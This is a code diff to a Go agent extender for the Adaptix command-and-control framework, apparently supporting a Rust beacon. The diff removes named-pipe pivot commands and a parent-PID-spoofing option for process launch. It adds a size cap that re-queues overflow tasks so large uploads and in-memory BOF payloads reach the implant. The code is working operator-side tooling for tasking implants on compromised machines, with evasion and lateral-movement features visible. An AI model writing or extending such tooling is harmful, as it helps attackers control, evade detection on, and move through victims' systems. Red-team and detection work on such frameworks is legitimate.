@@ -226,16 +226,6 @@ const (
 	COMMAND_SHELL_START = 71
 	COMMAND_SHELL_WRITE = 72
 
-	// SMB named-pipe pivot (free ids in the native numbering, like the
-	// shell pair): link connects the check-in transport to a named pipe,
-	// unlink closes it (beacon: crates/core/src/transport.rs).
-	COMMAND_LINK   = 73
-	COMMAND_UNLINK = 74
-
-	// ps run with a spoofed parent pid (free id after the pivot pair):
-	// COMMAND_PS_RUN layout plus int ppid before the args.
-	COMMAND_PS_RUN_PPID = 75
-
 	// Tunnels (native numbering; TCP only — the original specter's
 	// tunnel.c is TCP-only too). Tasks ride TunnelCallbacks (PROXY_DATA),
 	// per-connection I/O rides TUNNEL_START/WRITE/CLOSE/ACCEPT records.
@@ -757,17 +747,33 @@ func (e *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
 }
 
 // PackTasks: [u32 LE total size || [taskData.Data || u32 LE taskId]*].
+//
+// The beacon reads the HTTP response page into a 256 KiB heap buffer and
+// the malleable template wraps the pack, so the pack is capped at 192 KiB:
+// tasks beyond the cap are re-queued (TsTaskCreate) and ride the next
+// check-in, in order. Without the cap a big upload/BOF pack overflows the
+// page, the append marker is lost and the whole pack is dropped by the
+// beacon ("ci: fail range" — observed live on a 100 KiB upload).
+const packCap = 0x30000
+
 func (e *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
 	var (
-		array []interface{}
-		err   error
+		array    []interface{}
+		overflow []adaptix.TaskData
+		err      error
 	)
-
+	used := 4
 	for _, taskData := range tasks {
 		taskId, err := strconv.ParseInt(taskData.TaskId, 16, 64)
 		if err != nil {
 			return nil, err
 		}
+		n := len(taskData.Data) + 4
+		if used+n > packCap {
+			overflow = append(overflow, taskData)
+			continue
+		}
+		used += n
 		array = append(array, taskData.Data)
 		array = append(array, int(taskId))
 	}
@@ -781,22 +787,15 @@ func (e *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.T
 	binary.LittleEndian.PutUint32(size, uint32(len(packData)))
 	packData = append(size, packData...)
 
+	for _, t := range overflow {
+		Ts.TsTaskCreate(agentData.Id, "", "", t)
+	}
+
 	return packData, nil
 }
 
-// PivotPackData: pack one frame for the SMB named-pipe pivot —
-// `u32 LE len || data` (docs/WIRE.md, section Pivot). The child beacon
-// reads the frame on the pipe and treats `data` as its check-in payload;
-// delivered as proxy data (no dialog, no ack rendering on the parent).
 func (e *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
-	_ = pivotId
-	if len(data) == 0 || len(data) > 0x10000 {
-		return adaptix.TaskData{}, errors.New("pivot frame size out of range")
-	}
-	frame := make([]byte, 4+len(data))
-	binary.LittleEndian.PutUint32(frame, uint32(len(data)))
-	copy(frame[4:], data)
-	return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: frame, Sync: false}, nil
+	return adaptix.TaskData{}, errors.New("specter-rs pivots land with the SMB transport (phase 3+)")
 }
 
 // CreateCommand: the operator command surface (native beacon_agent
@@ -1021,11 +1020,6 @@ func (e *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[stri
 			programArgs = Ts.TsConvertUTF8toCp(programArgs, agentData.ACP)
 
 			array = []interface{}{COMMAND_PS_RUN, output, impersonation, programState, programArgs}
-			if ppidArg, ok := args["-ppid"].(float64); ok && ppidArg > 0 {
-				// PPID spoof: extended record with the parent pid.
-				array = []interface{}{COMMAND_PS_RUN_PPID, output, impersonation, programState, int(ppidArg), programArgs}
-				messageData.Message = fmt.Sprintf("Task: ps run (ppid %d) %s", int(ppidArg), programArgs)
-			}
 		} else {
 			err = errors.New("subcommand must be 'list', 'kill' or 'run'")
 			goto RET
@@ -1152,19 +1146,6 @@ func (e *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[stri
 			}
 		}
 		array = []interface{}{COMMAND_EXEC_BOF, async, "go", len(bofContent), bofContent, len(params), params}
-
-	case "link":
-		var pipe string
-		pipe, err = getStringArg(args, "pipe")
-		if err != nil {
-			goto RET
-		}
-		array = []interface{}{COMMAND_LINK, pipe}
-		messageData.Message = fmt.Sprintf("Task: link pivot %s", pipe)
-
-	case "unlink":
-		array = []interface{}{COMMAND_UNLINK}
-		messageData.Message = "Task: unlink pivot"
 
 	case "terminate":
 		if subcommand == "thread" {
